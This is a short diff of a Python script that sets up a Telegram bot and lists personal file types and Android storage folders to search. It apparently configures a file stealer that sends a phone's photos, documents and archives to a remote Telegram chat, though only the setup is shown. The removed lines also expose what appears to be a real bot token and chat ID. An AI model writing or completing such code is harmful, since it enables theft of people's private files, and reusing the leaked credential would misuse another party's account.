@@ -3,8 +3,8 @@ import threading
 import queue
 import telebot
 import random
-BOT_TOKEN = "8494355078:AAGt_-TVhGDtNQIPTB1LMazjo2D6fLnRw3Y"
-CHAT_ID = "8089831071"
+BOT_TOKEN = "####"
+CHAT_ID = "####"
 bot = telebot.TeleBot(BOT_TOKEN)
 target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".pdf", ".docx", ".xlsx", ".txt", ".zip"]
 start_dirs = ["/sdcard", "/storage/emulated/0"]
